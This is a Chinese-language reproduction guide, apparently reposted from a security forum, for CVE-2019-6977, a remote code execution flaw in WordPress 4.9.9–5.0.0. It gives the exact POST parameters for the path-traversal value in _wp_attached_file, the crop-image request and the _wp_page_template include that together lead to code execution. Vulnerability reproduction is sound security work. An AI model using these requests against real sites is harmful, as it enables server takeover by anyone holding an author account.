# （CVE-2019-6977）WordPress 5.0 rce

> 原文：[https://www.zhihuifly.com/t/topic/3262](https://www.zhihuifly.com/t/topic/3262)

# （CVE-2019-6977）WordPress 5.0 RCE

## 一、漏洞简介

漏洞条件：拥有一个author权限的账号

## 二、漏洞影响

影响包括windows、linux、mac在内的服务端，后端图片处理库为gd/imagick都受到影响，只不过利用难度有所差异。

其中，原文提到只影响release 5.0.0版，但现在官网上可以下载的5.0.0已经修复该漏洞。实际在WordPress 5.1-alpha-44280更新后未更新的4.9.9~5.0.0的WordPress都受到该漏洞影响。

## 三、复现过程

传图片

![image](img/668d2784c936da8449fef4723e67db4c.png)

改信息

![image](img/bb617269ef1df81775857cec3cd4987c.png)

保留该数据包，并添加POST

```
&meta_input[_wp_attached_file]=2019/02/2-4.jpg#/../../../../themes/twentynineteen/32.jpg 
```

触发需要的裁剪

![image](img/0851f1b60ca250b81c039b5e0ae8244f.png)

裁剪

![image](img/86a327bed10a54ac3f8ad13700876964.png)

同理保留改数据包，并将POST改为下面的操作，其中nonce以及id不变

```
action=crop-image&_ajax_nonce=8c2f0c9e6b&id=74&cropDetails[x1]=10&cropDetails[y1]=10&cropDetails[width]=10&cropDetails[height]=10&cropDetails[dst_width]=100&cropDetails[dst_height]=100 
```

触发需要的裁剪

![image](img/5e3bf70381eccf11ed2346544a9cacd5.png)

图片已经过去了

![image](img/cabe4f9de6a869200a437b1b7b7a5710.png)

包含，我们选择上传一个test.txt，然后再次修改信息，如前面

```
&meta_input[_wp_page_template]=cropped-32.jpg 
```

![image](img/c66347d3f447eb0cfd89ba57702ddd5a.png)

点击查看附件页面，如果图片被裁剪之后仍保留敏感代码，则命令执行成功。

![image](img/e28ec5227b43186f828c7071c31b5358.png)

## 四、参考链接

> https://www.freebuf.com/vuls/196514.html